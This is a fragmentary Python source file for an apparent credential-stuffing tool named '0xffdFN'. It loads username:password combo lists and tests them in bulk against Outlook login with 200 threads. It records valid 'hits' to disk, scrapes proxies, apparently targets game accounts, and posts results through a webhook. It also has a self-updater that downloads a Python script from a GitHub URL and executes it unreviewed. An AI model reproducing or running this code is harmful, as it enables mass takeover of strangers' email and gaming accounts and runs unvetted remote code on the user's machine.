...
'''
        ...
        while True:
            try:
                r = requests.get('https://raw.githubusercontent.com/Cristi24135123512351512/pascfndeluxe/main/version.txt')
                ver = r.text.strip()
                break
            except:
        ...
        if str(ver) == str(self.version):
            ...
            while True:
                try:
                    r = requests.get('https://raw.githubusercontent.com/Cristi24135123512351512/pascfndeluxe/main/0xffFN.py', timeout=10)
                    with open(f'0xffFN{ver}.py', 'w', encoding='utf8') as file:
                        file.write(r.text)
                    break
                except Exception as e:
                    print(f'{Fore.RED}Error downloading new version {e}')
            os.system('cls')
            os.system(f'py 0xffFN{ver}.py')
        from time import time
        system('cls')
        windll.kernel32.SetConsoleTitleW(
                f'0xffdFN | v{self.version} | Select a mode')
        print(self.t)
        print(f'''
                                ...
                                {Fore.WHITE}[{Fore.GREEN}6{Fore.WHITE}] Hotmail Checker   {Fore.WHITE}[{Fore.CYAN}Check Hotmails using Outlook authentication{Fore.WHITE}]
...
''')
        ...
        if mode == "5":
            ...
            print(self.t)
            windll.kernel32.SetConsoleTitleW(
                f'0xffdFN V{self.version} | Module: ComboEditor')
            print(f'''
...
''')
            ...
            system('cls')
            import time
            def check_outlook_account(username, password):
                """
                Check if an Outlook account is valid by attempting to log in.

                Args:
                    username (str): Outlook account username
                    password (str): Outlook account password
                ...
                try:
                    ...
                    # If we reach this point, account is valid
                    return True
                except smtplib.SMTPAuthenticationError:
                    # If authentication fails, account is invalid
                    return False
                finally:
            ...
            def load_accounts_from_file(file_path):
                """
                Load Outlook accounts from a file.

                Args:
                    file_path (str): Path to file containing accounts
                ...
                with open(file_path, 'r') as file:
                    for line in file:
                        line = line.strip()
                        if line and ':' in line:  # Check if the line is not empty and contains a colon
                            username, password = line.split(':', 1)  # Split only on the first colon
            ...
            def select_file():
                root = tk.Tk()
                root.withdraw()
                file_path = filedialog.askopenfilename(title="Select Account File")
                return file_path
            ...
            def create_results_folder():
                ...
                Returns:
                    str: Path to the hits file
                """
                # Create base results folder
                results_folder = 'results'
                os.makedirs(results_folder, exist_ok=True)

                hotmails_folder = os.path.join(results_folder, 'Hotmails')
                os.makedirs(hotmails_folder, exist_ok=True)

                date_time_folder = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
                date_time_path = os.path.join(hotmails_folder, date_time_folder)
                os.makedirs(date_time_path, exist_ok=True)

                hits_file_path = os.path.join(date_time_path, 'hits.txt')
                return hits_file_path, date_time_path  # Return both hits file path and date time path

            def update_console_title(hits, fails, cpm):
                """
                Update the console title with the number of hits, fails, and accounts checked per minute.

                Args:
                    hits (int): Number of valid accounts
                    fails (int): Number of invalid accounts
                    cpm (int): Accounts checked per minute
                """
                windll.kernel32.SetConsoleTitleW(
                    f'0xffdFN | v{self.version} | Hotmails: Hits: {hits} Fails: {fails} CPM: {cpm}')

            def print_message(message):
                """
                Print a message to the console while acquiring a lock.
            ...
            def check_account(account, hits_file_path, hits, fails):
                username = account['username']
                password = account['password']

                # Check account
                if check_outlook_account(username, password):
                    hit_message = f"{username}:{password}\n"
                    print_message(f"{Fore.GREEN}Hit: {Fore.WHITE} {hit_message.strip()}")
                    with open(hits_file_path, 'a') as hits_file:
                        hits_file.write(hit_message)
                    hits[0] += 1
                else:
                    fail_message = f"{username}:{password}"
                    print_message(f"{Fore.RED}Fail: {Fore.WHITE} {fail_message.strip()}")
                    fails[0] += 1

            def check_accounts(accounts, hits_file_path):
                hits = [0]
                fails = [0]
                start_time = time.time()

                with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
                    futures = [executor.submit(check_account, account, hits_file_path, hits, fails) for account in
                               accounts]

                    for future in concurrent.futures.as_completed(futures):
                        # Update console title after each account check
                        elapsed_time = time.time() - start_time
                        cpm = int((hits[0] + fails[0]) / (elapsed_time / 60)) if elapsed_time > 0 else 0
                        update_console_title(hits[0], fails[0], cpm)

                return hits[0], fails[0]  # Return hits and fails for summary

            def main():
                global console_lock  # Use the global console_lock variable
                console_lock = threading.Lock()  # Create a lock for console output

                file_path = select_file()
                accounts = load_accounts_from_file(file_path)

                # Create results folder and hits file
                hits_file_path, date_time_path = create_results_folder()

                # Check each account
                hits, fails = check_accounts(accounts, hits_file_path)

                # Print a summary
                print("\nSummary:")
                print(f"File name: {file_path}")
                print(f"{Fore.GREEN}HITS: {Fore.WHITE} {hits}")
                print(f"{Fore.RED}FAILS: {Fore.WHITE} {fails}")
                print("")
            ...
            windll.kernel32.SetConsoleTitleW(
                f'0xffdFN | v{self.version} | Scraping Proxies | 0xffProxy')
            ...
            while True:
                ...
                if len(urls) > 0:
                    ...
                    break
            windll.kernel32.SetConsoleTitleW(
                f'0xffdFN | v{self.version} | Done Scraping | 0xfProxy')
        ...
        if not Counter.proxy:
            ...
            while True:
                try:
                    if Checker.mode.lower() in ('fn', 'cn', 'nexus'):
                        self.cuimode = 'y'
                        break
            ...
            if self.cuimode == 'y':
                while True:
                    try:
                        if Checker.mode.lower() == 'fn':
                            self.cuitype = 'fn'
                            print(Fore.MAGENTA)
                            print_slowly('Using 0xffdFN CUI', 0.05)
                            break
                            ...
                            Checker.mode = input(f'{Fore.LIGHTCYAN_EX}CUI mode? 0xf/cn/nexus: ')
                    except:
                        print(f'{Fore.RED}Invalid input')
        ...
        print(f'{Fore.LIGHTCYAN_EX}[0xffdFN] Starting Threads...\n')
        windll.kernel32.SetConsoleTitleW(
            f'0xffdFN | v{self.version} | Getting ready!')
        ...
        print(f'{Fore.GREEN}[0xffdFN] Done!\n')
        sleep(3)
        system('cls')
        print(self.t)
        if not Counter.proxy:
                                        ...
                                        try:
                                            ...
                                            if Checker.webhook.webhooky:
                                                payload = {
                                                        ...
                                                        "embeds": [
                                                            {
                                                            "author": {"name": "0xffdFN", "url": "https://github.com/Cristi24135123512351512", "icon_url": "https://cdn-icons-png.flaticon.com/512/25/25231.png"},
                                                            "title": display_name,
                                                            "color": 15054874,
                                                            "fields": [
